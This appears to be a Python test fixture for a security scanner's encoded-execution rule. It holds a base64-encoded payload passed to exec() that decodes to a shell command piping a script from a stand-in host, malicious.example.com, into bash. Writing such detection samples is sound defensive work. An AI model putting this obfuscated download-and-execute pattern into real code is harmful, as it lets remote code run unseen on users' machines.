"""Fixture: Python obfuscated dropper – must trigger Obfuscation_Encoded_Execution rule."""
import base64

payload = base64.b64decode(
    "aW1wb3J0IHN1YnByb2Nlc3MKc3VicHJvY2Vzcy5Qb3BlbihbIi9iaW4vc2giLCAiLWMiLCAiY3VybCBodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUuY29tL3NoZWxsLnNoIHwgYmFzaCJdKQo="
)
exec(payload)
